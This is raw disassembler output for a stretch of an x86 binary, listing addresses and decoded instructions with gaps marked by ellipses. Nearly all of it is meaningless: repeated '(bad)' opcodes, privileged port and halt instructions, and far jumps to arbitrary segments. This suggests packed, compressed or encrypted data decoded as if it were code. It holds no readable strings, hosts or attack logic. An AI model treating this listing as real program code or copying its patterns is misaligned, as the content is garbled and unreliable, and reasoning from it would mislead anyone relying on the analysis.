  4295fe:	repnz sub ch,BYTE PTR [edi+ebx*8]
  429602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429603:	aad    0x1a
  429605:	dec    esp
  429606:	(bad)  
  429607:	aad    0xed
  429609:	fst    QWORD PTR ds:0x50010bc9
  42960f:	shl    edi,0x0
	...
  429672:	add    BYTE PTR [eax],al
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	dec    eax
  429681:	mov    ebp,0xbb55a60b
  429686:	add    DWORD PTR [eax],eax
  429688:	add    eax,0xbb000001
  42968d:	pop    eax
  42968e:	ror    dl,1
  429690:	dec    ebx
  429691:	mov    edx,0x415767ba
  429696:	mov    ds:0x57405fdf,al
  42969b:	retf   
  42969c:	ret    0x7098
  42969f:	das    
  4296a0:	into   
  4296a1:	out    0x41,al
  4296a3:	xchg   DWORD PTR [edi],edi
  4296a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296a6:	xchg   ebp,eax
  4296a7:	push   0x8c42b3ca
  4296ac:	loope  0x4296e4
  4296ae:	dec    eax
  4296af:	xor    esi,edx
  4296b1:	jge    0x429685
  4296b3:	push   ebx
  4296b4:	or     al,BYTE PTR [edi+0x9e6ca80]
  4296ba:	mov    fs,WORD PTR [edi+0x15790e3a]
  4296c0:	call   0xaed08fbb
  4296c5:	aad    0x6c
  4296c7:	lea    eax,[ecx-0x4c]
  4296ca:	ret    0xa1f0
  4296cd:	stos   BYTE PTR es:[edi],al
  4296ce:	ins    DWORD PTR es:[edi],dx
  4296cf:	out    0x55,eax
  4296d1:	leave  
  4296d2:	stos   BYTE PTR es:[edi],al
  4296d3:	and    eax,0xd96fc5fb
  4296d8:	dec    edx
  4296d9:	pop    eax
  4296da:	jno    0x429731
  4296dc:	fld    DWORD PTR [eax+edi*8]
  4296df:	mov    eax,0xa18209e6
  4296e4:	mov    eax,ds:0x5710fe72
  4296e9:	jbe    0x42973e
  4296eb:	test   al,0x8a
  4296ed:	call   0x803e6d6e
  4296f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296f3:	repnz sbb BYTE PTR [edx-0x74f912c9],0xd1
  4296fb:	cmp    BYTE PTR [edi-0x33],0x61
  4296ff:	dec    ecx
  429700:	or     al,0x47
  429702:	cmc    
  429703:	cmp    esp,ebx
  429705:	mov    ah,0xdb
  429707:	std    
  429708:	fdivr  st,st(7)
  42970a:	test   BYTE PTR [eax+0x782ec087],bh
  429710:	cld    
  429711:	fwait
  429712:	ret    0x36f9
  429715:	xor    eax,DWORD PTR [edi-0x7045e2b3]
  42971b:	pop    eax
  42971c:	push   eax
  42971d:	mov    al,0x95
  42971f:	ret    
  429720:	pop    ecx
  429721:	mov    bh,0xc8
  429723:	sbb    ch,BYTE PTR [ecx+0x17]
  429726:	cmc    
  429727:	inc    edx
  429728:	sahf   
  429729:	hlt    
  42972a:	push   es
  42972b:	dec    edx
  42972c:	mov    dh,0x2e
  42972e:	repz call 0x3770:0x139a1aa3
  429736:	adc    eax,0x5bdb4880
  42973b:	cmp    ecx,DWORD PTR [edx]
  42973d:	adc    BYTE PTR [edi+0x5],0x11
  429741:	adc    dl,ah
  429743:	adc    eax,0x7c1d49b4
  429748:	pushf  
  429749:	or     bh,BYTE PTR [edi-0x31]
  42974c:	call   FWORD PTR [ebp+0x7d77a732]
  429752:	add    esp,ebx
  429754:	fist   WORD PTR [ecx]
  429756:	retf   0x8422
  429759:	xchg   ebx,eax
  42975a:	inc    edi
  42975b:	out    0xf4,al
  42975d:	mov    edi,DWORD PTR [eax]
  42975f:	sub    ecx,DWORD PTR [eax-0x27666dcc]
  429765:	pop    esi
  429766:	into   
  429767:	sub    al,0xd9
  429769:	xchg   BYTE PTR [ecx],ah
  42976b:	ret    
  42976c:	mov    ah,0x2
  42976e:	out    0xc6,eax
  429770:	xor    BYTE PTR [ecx+edx*2-0x51],0xa5
  429775:	out    0x33,al
  429777:	enter  0x991,0x2f
  42977b:	push   ss
  42977c:	mov    ebx,0xd32f3d4f
  429781:	fs pop eax
  429783:	mov    ds:0x87250049,eax
  429788:	ror    BYTE PTR [esi],0x16
  42978b:	jmp    0x7b:0x8a289641
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	push   eax
  429801:	mov    cs,WORD PTR [edi]
  429803:	xchg   edx,eax
  429804:	pop    edx
  429805:	mov    esp,0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	out    dx,al
  42980d:	adc    al,0x49
  42980f:	sbb    bh,BYTE PTR [ebx+0x57]
  429812:	pop    ebx
  429814:	adc    DWORD PTR [ebx+0x319a7e11],ecx
  42981a:	dec    ebx
  42981b:	fucomi st,st(2)
  42981d:	mov    ss,eax
  42981f:	cld    
  429820:	std    
  429821:	int    0x7
  429823:	sub    al,0x7a
  429825:	xor    eax,0x8f7bd819
  42982a:	and    al,0xe9
  42982c:	dec    ebx
  42982d:	mov    al,0x2e
  42982f:	mov    esi,0x4a43b740
  429834:	mov    ebp,0xb3682eb5
  429839:	in     eax,0x87
  42983b:	stos   BYTE PTR es:[edi],al
  42983c:	fadd   QWORD PTR [ebp-0x7e]
  42983f:	xchg   edi,eax
  429840:	fist   DWORD PTR ds:0x1d2eaa2c
  429846:	sub    edx,DWORD PTR [edi]
  429848:	gs out 0x2c,eax
  42984b:	dec    ebx
  42984c:	fstp   QWORD PTR [esi+edx*1]
  42984f:	push   esp
  429850:	lods   al,BYTE PTR ds:[esi]
  429851:	iret   
  429852:	lods   al,BYTE PTR ds:[esi]
  429853:	sbb    al,0x62
  429855:	mov    WORD PTR [ebx-0x2ebcdb3],cs
  42985b:	cs jnp 0x42984a
  42985e:	retf   
  42985f:	dec    edx
  429860:	test   eax,0x7f7e35b8
  429865:	shl    dl,1
  429867:	(bad)  
  429868:	loop   0x4298d3
  42986a:	and    eax,0x1b4ec2a4
  42986f:	mov    ch,0xe
  429871:	outs   dx,DWORD PTR ds:[esi]
  429872:	inc    ebp
  429873:	cmp    ch,BYTE PTR [edx]
  429875:	loop   0x429858
  429877:	jns    0x4298e4
  429879:	mov    DWORD PTR [ecx+0x45],0x7ff3c0fd
  429880:	add    BYTE PTR [ecx+ebx*2-0x6c],bh
  429884:	and    BYTE PTR [ebx+ecx*2],ah
  429887:	sub    BYTE PTR [ebx+0x2e51e19e],dh
  42988d:	xchg   ebx,eax
  42988e:	(bad)  
  42988f:	mov    al,0xd9
  429891:	cmp    eax,0x2a9878a
  429896:	or     al,0x31
  429898:	les    esp,FWORD PTR [ebx-0x68]
  42989b:	aam    0x29
  42989d:	sbb    eax,0xda7a617e
  4298a2:	into   
  4298a3:	push   ecx
  4298a4:	jg     0x4298dc
  4298a6:	jo     0x42988f
  4298a8:	cs xor al,0x4a
  4298ab:	push   ds
  4298ac:	outs   dx,BYTE PTR ds:[esi]
  4298ad:	cmp    edi,DWORD PTR [ebx-0x2fb3b534]
  4298b3:	pop    es
  4298b4:	push   esp
  4298b5:	inc    edi
  4298b6:	mov    ss,edx
  4298b8:	pushf  
  4298b9:	mov    dl,0x23
  4298bb:	repnz arpl WORD PTR [esi+0x34],ax
  4298bf:	sub    al,BYTE PTR [esi]
  4298c1:	jb     0x42991b
  4298c3:	or     edi,edx
  4298c5:	mov    ds:0x1d64feb3,eax
  4298ca:	mov    edx,0x3e00cfa
  4298cf:	sub    al,0x52
  4298d1:	push   esp
  4298d2:	xchg   BYTE PTR [ecx-0x7c690b6b],ch
  4298d8:	xchg   edx,eax
  4298d9:	xchg   esp,eax
  4298da:	dec    esi
  4298db:	adc    esi,eax
  4298dd:	mov    DWORD PTR [esi+0x748847e4],ebp
  4298e3:	jp     0x429930
  4298e5:	inc    eax
  4298e6:	pop    eax
  4298e7:	and    eax,0xf80b9167
  4298ec:	pushf  
  4298ed:	rep outs dx,DWORD PTR ds:[esi]
  4298ef:	sub    bh,BYTE PTR [ebp+0x7b71cf9e]
  4298f5:	sar    BYTE PTR [ebx+ebx*8+0x3f],0x20
  4298fa:	and    ebx,esp
  4298fc:	sub    edx,DWORD PTR [ebp-0x35b53b8e]
  429902:	xor    cl,BYTE PTR [edi]
  429904:	imul   esi,ebp,0xc4f58640
  42990a:	rcl    DWORD PTR [ebx-0x2a],1
  42990d:	iret   
  42990e:	ret    0x465e
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	xchg   BYTE PTR [ecx],al
  429982:	out    0x6d,al
  429984:	pop    edi
  429985:	mov    ebp,0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	push   ebp
  42998d:	push   ecx
  42998e:	cmp    ch,BYTE PTR [ebx+0x4e]
  429991:	sub    edx,esp
  429993:	adc    edi,DWORD PTR [edi+eiz*4+0x142de22f]
  42999a:	rcl    BYTE PTR [ecx-0x7287dc92],1
  4299a0:	cdq    
  4299a1:	fcmovu st,st(7)
  4299a3:	jg     0x429a01
  4299a5:	dec    esp
  4299a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299a7:	add    al,0x6c
  4299a9:	stos   BYTE PTR es:[edi],al
  4299aa:	inc    esp
  4299ab:	dec    edi
  4299ac:	sti    
  4299ad:	cwde   
  4299ae:	pop    ebp
  4299af:	jmp    0x4299d6
  4299b1:	outs   dx,DWORD PTR ds:[esi]
  4299b2:	inc    edx
  4299b3:	cmc    
  4299b4:	xor    esi,DWORD PTR [edx-0x5a]
  4299b7:	call   0xea08:0x18722d82
  4299be:	shr    DWORD PTR [esi+0x4c],1
  4299c1:	adc    ecx,esi
  4299c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299c4:	in     al,0x52
  4299c6:	out    0x87,al
  4299c8:	je     0x4299c3
  4299ca:	jge    0x42995a
  4299cc:	mov    cl,0x7a
  4299ce:	add    eax,0x9a13767f
  4299d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4299d4:	call   0xb75e90c
  4299d9:	and    al,0x1a
  4299db:	dec    esi
  4299dc:	pop    esi
  4299dd:	xchg   BYTE PTR [esi+0x65],ch
  4299e0:	push   cs
  4299e1:	fcmove st,st(3)
  4299e3:	add    bh,BYTE PTR [esi-0x75dfe5f5]
  4299e9:	pop    es
  4299ea:	and    eax,0x804b9893
  4299ef:	push   eax
  4299f0:	or     ebp,edi
  4299f2:	mov    ds:0x95b2b7d9,eax
  4299f7:	fstp   st(3)
  4299f9:	xor    al,0x1b
  4299fb:	lods   al,BYTE PTR ds:[esi]
  4299fc:	pop    edi
  4299fd:	and    DWORD PTR [ecx+0x21b8530b],0xcd59766f
  429a07:	push   ebp
  429a08:	dec    edx
  429a09:	mov    esi,esp
  429a0b:	cwde   
  429a0c:	inc    eax
  429a0d:	dec    edi
  429a0e:	push   ebx
  429a0f:	xor    dh,BYTE PTR [eax+0xb9102d5]
  429a15:	sahf   
  429a16:	add    dh,cl
  429a18:	aad    0x32
  429a1a:	fld    TBYTE PTR [ebp-0x3c2f9321]
  429a20:	in     eax,dx
  429a21:	fistp  DWORD PTR [esi]
  429a23:	sti    
  429a24:	(bad)  
  429a25:	fwait
  429a26:	popa   
  429a27:	add    al,0x93
  429a29:	sub    ebp,esi
  429a2b:	lahf   
  429a2c:	loope  0x429a92
  429a2e:	dec    edx
  429a2f:	les    edi,FWORD PTR [eax]
  429a31:	or     DWORD PTR [edx+0x728c1ca3],ecx
  429a37:	jno    0x429a2b
  429a39:	sbb    eax,0x95565523
  429a3e:	out    dx,eax
  429a3f:	mov    DWORD PTR [ebx],esp
  429a41:	shl    edx,1
  429a43:	sbb    ch,BYTE PTR ds:[edi+ebp*2]
  429a47:	fisubr WORD PTR [eax-0x5e497fe5]
  429a4d:	fimul  WORD PTR [ecx+edx*4+0x6d]
  429a51:	cmp    DWORD PTR [ecx+0x1e50e5aa],esi
  429a57:	sbb    dh,BYTE PTR [edi+0x72]
  429a5a:	sub    bh,0x50
  429a5d:	mov    eax,0x9eeeea35
  429a62:	imul   esp,DWORD PTR [edi-0x1979939c],0x5e95f7d6
  429a6c:	bound  ecx,QWORD PTR [bp+di-0x50b9]
  429a71:	xchg   esp,eax
  429a72:	adc    cl,BYTE PTR [edx]
  429a74:	pop    eax
  429a75:	cmp    bh,BYTE PTR [ecx-0x51154800]
  429a7b:	stos   DWORD PTR es:[edi],eax
  429a7c:	xchg   esi,eax
  429a7d:	mov    eax,ds:0x5cc63b54
  429a82:	leave  
  429a83:	jo     0x429a4f
  429a85:	pop    ebp
  429a86:	xchg   cl,dh
  429a88:	mov    ds:0x6f494c16,eax
  429a8d:	repz or ecx,DWORD PTR [eiz*1+0x0]
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x2ea95667
  429b01:	retf   
  429b02:	jle    0x429ac6
  429b04:	fs mov esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	sahf   
  429b0d:	pop    ecx
  429b0e:	les    ebx,FWORD PTR [ebp+0x5ce148cb]
  429b14:	xchg   ecx,eax
  429b15:	sbb    eax,0xd58b83b
  429b1a:	and    dl,BYTE PTR [ebx-0x4d9b00ab]
  429b20:	sub    dh,cl
  429b22:	xor    BYTE PTR [esi-0x58],dh
  429b25:	test   al,0xca
  429b27:	mov    bl,0x21
  429b29:	push   0xffffffd6
  429b2b:	jno    0x429b10
  429b2d:	sbb    ah,bl
  429b2f:	inc    BYTE PTR [esi+0x29bfae24]
  429b35:	jl     0x429b2d
  429b37:	aaa    
  429b38:	pop    esp
  429b39:	mov    WORD PTR [edx],gs
  429b3b:	fistp  DWORD PTR [ecx-0x4]
  429b3e:	xor    eax,0x28d48d41
  429b43:	sub    BYTE PTR gs:[edi+0x19],bl
  429b47:	cli    
  429b48:	lea    ebx,[eax-0x76113328]
  429b4e:	push   ebp
  429b4f:	and    al,0x84
  429b51:	and    DWORD PTR [edx-0x50b09a],0xd2e0d57
  429b5b:	xchg   DWORD PTR [ebx+eax*2],esi
  429b5e:	mov    edi,0x8c4155
  429b63:	mov    ch,0xf1
  429b65:	or     eax,0xfd4fb7b4
  429b6a:	xchg   esi,eax
  429b6b:	imul   eax,DWORD PTR [ebx-0x2234e5f4],0x3c97ca0d
  429b75:	mov    ecx,0x5d56f1b3
  429b7a:	cmp    BYTE PTR [edi+0xa50b53f],0x7b
  429b81:	sti    
  429b82:	push   ds
  429b83:	mov    edi,0xc67c6f0e
  429b88:	xor    esi,DWORD PTR [edx+0x63]
  429b8b:	sar    ecx,cl
  429b8d:	ins    BYTE PTR es:[edi],dx
  429b8e:	test   eax,0x40dfd2ab
  429b93:	lods   eax,DWORD PTR ds:[esi]
  429b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b95:	in     al,0x5a
  429b97:	fnstsw WORD PTR [edi+0x213250a0]
  429b9d:	in     al,0x41
  429b9f:	jge    0x429bec
  429ba1:	push   edx
  429ba2:	mov    esi,0xe33d73be
  429ba7:	ret    0x4567
  429baa:	inc    eax
  429bab:	shl    BYTE PTR [ebx-0x7a],0x8
  429baf:	cli    
  429bb0:	add    al,0x2c
  429bb2:	popa   
  429bb3:	(bad)  
  429bb4:	ret    0xc94e
  429bb7:	pushf  
  429bb8:	mov    ebp,?
  429bba:	xchg   ebp,eax
  429bbb:	daa    
  429bbc:	arpl   si,bx
  429bbe:	loope  0x429b84
  429bc0:	ret    
  429bc1:	retf   0xd052
  429bc4:	sub    dh,BYTE PTR [edi-0x64]
  429bc7:	dec    esp
  429bc8:	xchg   edx,eax
  429bc9:	push   ebx
  429bca:	jns    0x429baf
  429bcc:	adc    DWORD PTR [esi+ecx*1-0x6b],esp
  429bd0:	cld    
  429bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bd2:	ror    dl,cl
  429bd4:	lock xchg ebp,eax
  429bd6:	mov    BYTE PTR [ecx+0x59],dh
  429bd9:	in     eax,dx
  429bda:	icebp  
  429bdb:	inc    edx
  429bdc:	imul   DWORD PTR [eax+0x4fb56c1f]
  429be2:	loop   0x429c1a
  429be4:	cmp    dh,ah
  429be6:	mov    ds:0x14371a6b,al
  429beb:	aaa    
  429bec:	fnstenv [ecx]
  429bee:	add    DWORD PTR [edx],ebx
  429bf0:	in     eax,dx
  429bf1:	aas    
  429bf2:	gs mov ebp,0xff2769a3
  429bf8:	(bad)  
  429bf9:	in     eax,0x9c
  429bfb:	fnstcw WORD PTR [esi+ecx*4-0x16dea245]
  429c02:	test   BYTE PTR [eax-0x73a2561a],bh
  429c08:	mov    edi,eax
  429c0a:	and    BYTE PTR [ebx+0x7965655d],dl
  429c10:	in     al,dx
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [esi],dl
  429c81:	ret    
  429c82:	push   0x41
  429c84:	imul   edi,DWORD PTR [edi+0x1050001],0xe430000
  429c8e:	std    
  429c8f:	ja     0x429c7b
  429c91:	push   ebx
  429c92:	loop   0x429c3e
  429c94:	jne    0x429c79
  429c96:	dec    eax
  429c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c98:	push   esp
  429c99:	sbb    edi,edi
  429c9b:	aaa    
  429c9c:	pusha  
  429c9d:	and    ebx,DWORD PTR [eax+ecx*4]
  429ca0:	sub    DWORD PTR [ecx+0x1],ebx
  429ca3:	fwait
  429ca4:	stc    
  429ca5:	add    ebp,0x3e7a6632
  429cab:	inc    eax
  429cac:	xchg   ebp,eax
  429cad:	mov    ah,0x64
  429caf:	lds    ecx,FWORD PTR [ebx]
  429cb1:	push   ss
  429cb2:	xchg   BYTE PTR [edi+0x24d97f68],dl
  429cb8:	fldcw  WORD PTR [edi-0x31b92693]
  429cbe:	push   esp
  429cbf:	adc    edi,esi
  429cc1:	jae    0x429c99
  429cc3:	dec    ebx
  429cc4:	or     esi,DWORD PTR [ecx]
  429cc6:	int    0x1e
  429cc8:	call   0x2952:0x89a3f18e
  429ccf:	dec    esp
  429cd0:	jl     0x429ccb
  429cd2:	loope  0x429cc8
  429cd4:	loop   0x429c7a
  429cd6:	outs   dx,DWORD PTR ds:[esi]
  429cd7:	or     ebp,DWORD PTR [edi]
  429cd9:	pop    es
  429cda:	adc    DWORD PTR [ecx-0x39],0xffffffb4
  429cde:	hlt    
  429cdf:	out    0xdb,al
  429ce1:	xchg   bh,al
  429ce3:	mov    al,0xa3
  429ce5:	sbb    ch,ch
  429ce7:	or     al,0x84
  429ce9:	lods   al,BYTE PTR ds:[esi]
  429cea:	loop   0x429cc6
  429cec:	mov    bl,0xda
  429cee:	ror    DWORD PTR [ebp+0x50],1
  429cf1:	add    ch,BYTE PTR [ebx+0x1bc3676d]
  429cf7:	and    ah,BYTE PTR [ebx]
  429cf9:	neg    DWORD PTR [eax-0x145224f8]
  429cff:	cld    
  429d00:	add    BYTE PTR [edx+0x42],dh
  429d03:	mov    ecx,0x71c96887
  429d08:	scas   al,BYTE PTR es:[edi]
  429d09:	xchg   edi,eax
  429d0a:	mov    ah,0x39
  429d0c:	out    dx,eax
  429d0d:	jmp    0xb38bd0c6
  429d12:	lahf   
  429d13:	test   BYTE PTR [esi-0x23],al
  429d16:	adc    ecx,0x50
  429d19:	int3   
  429d1a:	pop    ecx
  429d1b:	cmp    cl,BYTE PTR [edi-0x70]
  429d1e:	cmc    
  429d1f:	jo     0x429cba
  429d21:	jns    0x429cfc
  429d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d24:	push   eax
  429d25:	push   ebx
  429d26:	cmp    eax,0xfd2719e2
  429d2b:	or     ah,BYTE PTR [esi]
  429d2d:	imul   ebx,DWORD PTR [eax],0xffffffa4
  429d30:	ss xor al,0xe3
  429d33:	ss push ebx
  429d35:	cbw    
  429d37:	push   ds
  429d38:	icebp  
  429d39:	adc    DWORD PTR ds:0xf6e28cd5,0x7c
  429d40:	lea    ebp,[ecx-0x22]
  429d43:	pop    ss
  429d44:	inc    edi
  429d45:	adc    ch,BYTE PTR [ecx-0x5b]
  429d48:	jl     0x429dad
  429d4a:	mov    bl,0x28
  429d4c:	mov    ecx,0xadba72fc
  429d51:	mov    ebp,0xd0cc55a7
  429d56:	jle    0x429d79
  429d58:	pushf  
  429d59:	cs in  eax,0x70
  429d5c:	jg     0x429d1c
  429d5e:	data16 (bad) 
  429d60:	jnp    0x429dae
  429d62:	push   cs
  429d63:	cdq    
  429d64:	retf   0x5bd7
  429d67:	add    BYTE PTR [eax-0x57b8dad6],dl
  429d6d:	and    ch,bl
  429d6f:	aam    0xf0
  429d71:	into   
  429d72:	jne    0x429de2
  429d74:	out    dx,eax
  429d75:	inc    ebp
  429d76:	jmp    0x429dac
  429d78:	stos   DWORD PTR es:[edi],eax
  429d79:	add    BYTE PTR [esi],bl
  429d7b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  429d7d:	add    eax,0xb28e424a
  429d82:	xchg   BYTE PTR [edi],dl
  429d84:	add    ebp,DWORD PTR [edi-0x73a63ea8]
  429d8a:	jnp    0x429d30
  429d8c:	neg    bl
  429d8e:	(bad)  
  429d8f:	mov    ds:0xda,eax
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	hlt    
  429e01:	add    esi,edx
  429e03:	stc    
  429e04:	outs   dx,BYTE PTR ds:[esi]
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x5f000001
  429e0d:	lahf   
  429e0e:	dec    esp
  429e0f:	lods   al,BYTE PTR ds:[esi]
  429e10:	add    eax,0xec0ec495
  429e15:	cwde   
  429e16:	ins    DWORD PTR es:[edi],dx
  429e17:	imul   edi,DWORD PTR [ecx-0x7de41524],0x77
  429e1e:	ja     0x429dde
  429e20:	xchg   BYTE PTR [ecx+edx*2-0x22],bl
  429e24:	mov    ch,0xf
  429e26:	mov    dl,0x3b
  429e28:	sahf   
  429e29:	std    
  429e2a:	rol    BYTE PTR [ebx+0x33998163],cl
  429e30:	mov    ebx,edx
  429e32:	pop    es
  429e33:	dec    eax
  429e34:	leave  
  429e35:	out    0xf7,eax
  429e37:	outs   dx,BYTE PTR ds:[esi]
  429e38:	loopne 0x429dd4
  429e3a:	leave  
  429e3b:	mov    ebp,0xf8ab4595
  429e40:	ss inc ecx
  429e42:	cmp    DWORD PTR [esi],0xa691fcb1
  429e48:	jns    0x429ea8
  429e4a:	dec    esp
  429e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e4c:	ss xor al,0xf4
  429e4f:	mov    BYTE PTR [eax+0x51],ch
  429e52:	leave  
  429e53:	cmc    
  429e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e55:	cmp    DWORD PTR [esi+0x25bb58d4],0x9845f68e
  429e5f:	popf   
  429e60:	ror    ecx,0x18
  429e63:	push   edx
  429e64:	retf   0x8cd0
  429e67:	push   eax
  429e68:	mov    ah,BYTE PTR [esp+edi*4]
  429e6b:	mov    ecx,DWORD PTR [edx]
  429e6d:	mov    es,WORD PTR [ebx+0x18]
  429e70:	add    al,0x89
  429e72:	cmp    BYTE PTR [edi+0x3a],0x86
  429e76:	call   0xd4610b94
  429e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e7c:	push   ds
  429e7d:	(bad)  [edi+eiz*8]
  429e80:	in     al,0x6
  429e82:	lock leave 
  429e84:	xlat   BYTE PTR ds:[ebx]
  429e85:	sahf   
  429e86:	and    BYTE PTR [ebp-0x16d873bb],bl
  429e8c:	cmp    BYTE PTR [eax+0x84fe577],0xc5
  429e93:	fadd   QWORD PTR [ebp-0x32]
  429e96:	mov    ebx,0xec181454
  429e9b:	inc    ebp
  429e9c:	lea    ebx,[ebx]
  429e9e:	mov    esi,0x2c8c9855
  429ea3:	aas    
  429ea4:	(bad)  
  429ea5:	cmp    eax,0x2fa2e7ea
  429eaa:	test   esp,0xbda271c8
  429eb0:	jle    0x429ea4
  429eb2:	loop   0x429ef3
  429eb4:	dec    edi
  429eb5:	sub    BYTE PTR [edi],ah
  429eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429eb8:	mov    esi,0x89e65ac5
  429ebd:	jnp    0x429ea1
  429ebf:	stc    
  429ec0:	call   ecx
  429ec2:	nop
  429ec3:	mov    ecx,0xf3c3989
  429ec8:	xor    cl,BYTE PTR [edi]
  429eca:	ins    BYTE PTR es:[edi],dx
  429ecb:	repz jp 0x429e71
  429ece:	adc    al,0xf0
  429ed0:	inc    ecx
  429ed1:	lds    eax,FWORD PTR [ebx-0x1952fd6c]
  429ed7:	sub    BYTE PTR [eax],al
  429ed9:	pop    esp
  429eda:	xchg   ecx,eax
  429edb:	aaa    
  429edc:	pop    edx
  429edd:	xchg   esp,eax
  429ede:	or     BYTE PTR [ebp-0x70],0xf
  429ee2:	pop    ds
  429ee3:	mov    eax,ds:0x9f9c8437
  429ee8:	jle    0x429f01
  429eea:	ficomp DWORD PTR [edx+0x5158eec2]
  429ef0:	shr    ecx,cl
  429ef2:	sbb    ebx,edx
  429ef4:	in     eax,dx
  429ef5:	dec    esi
  429ef6:	out    dx,al
  429ef7:	scas   al,BYTE PTR es:[edi]
  429ef8:	mov    bl,0x2b
  429efa:	jae    0x429ea7
  429efc:	aad    0xa2
  429efe:	inc    esi
  429eff:	mov    dl,0x16
  429f01:	inc    edx
  429f02:	xchg   esi,eax
  429f03:	in     eax,dx
  429f04:	adc    BYTE PTR [eax+0x47368d5],ch
  429f0a:	out    0x4,eax
  429f0c:	ins    BYTE PTR es:[edi],dx
  429f0d:	popf   
  429f0e:	sbb    esp,DWORD PTR [ecx]
  429f10:	inc    esp
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x1f419df6]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x85000001
  429f8d:	xor    bl,dh
  429f8f:	mov    ecx,DWORD PTR [edx+ebx*2-0x18]
  429f93:	in     eax,dx
  429f94:	push   eax
  429f95:	nop
  429f96:	xchg   esp,eax
  429f97:	ret    
  429f98:	sub    edi,ecx
  429f9a:	pop    ebp
  429f9b:	jl     0x429f7f
  429f9d:	cwde   
  429f9e:	mov    dh,0x20
  429fa0:	cmc    
  429fa1:	ins    BYTE PTR es:[edi],dx
  429fa2:	or     DWORD PTR [ebx+0x13],0xbcbbea7b
  429fa9:	dec    eax
  429faa:	mov    eax,0xda7ab50f
  429faf:	jmp    FWORD PTR ds:0xcf4eb328
  429fb5:	(bad)  
  429fb7:	test   DWORD PTR [ebx+ebp*8+0x9],0x5de4bf6
  429fbf:	jg     0x429f97
  429fc1:	les    ebx,FWORD PTR [edi]
  429fc3:	add    BYTE PTR [edi+0x70],0xe
  429fc7:	cmp    eax,0x6101f7b
  429fcc:	xor    DWORD PTR [ebx-0x2b],ebx
  429fcf:	ins    DWORD PTR es:[edi],dx
  429fd0:	ds pop ss
  429fd2:	mov    cl,0xd7
  429fd4:	xchg   edi,eax
  429fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429fd6:	mov    es,WORD PTR [edx]
  429fd8:	dec    ecx
  429fd9:	mov    dh,0x6f
  429fdb:	inc    edx
  429fdc:	ficomp WORD PTR [edi-0x4b637e15]
  429fe2:	inc    edi
  429fe3:	aam    0xd0
  429fe5:	sbb    ah,0x90
  429fe8:	retf   0x838b
  429feb:	shl    ebx,0x63
  429fee:	ss or  dl,dl
  429ff1:	ds aaa 
  429ff3:	inc    DWORD PTR [esi-0x2e]
  429ff6:	out    0xd5,al
  429ff8:	mov    dl,0xea
  429ffa:	rol    ecx,0xe
  429ffd:	fsincos 
  429fff:	stos   DWORD PTR es:[edi],eax
  42a000:	out    0xe6,al
  42a002:	xchg   ecx,eax
  42a003:	(bad)  
  42a004:	adc    al,0x32
  42a006:	lea    ebx,[esi]
  42a008:	shl    DWORD PTR [edx-0x3f],cl
  42a00b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a00c:	mov    ah,0x93
  42a00e:	stos   BYTE PTR es:[edi],al
  42a00f:	int    0xee
  42a011:	fcomp  st(4)
  42a013:	bound  esp,QWORD PTR ds:0xc0a45798
  42a019:	into   
  42a01a:	and    ch,ch
  42a01c:	retf   
  42a01d:	(bad)  
  42a01e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a01f:	lock sub dl,BYTE PTR cs:[ecx+0x3a7766e9]
  42a027:	mov    al,0xb4
  42a029:	aaa    
  42a02a:	pop    edi
  42a02b:	pop    ds
  42a02c:	cwde   
  42a02d:	je     0x42a015
  42a02f:	jae    0x42a06f
  42a031:	and    bl,BYTE PTR [edx-0x48]
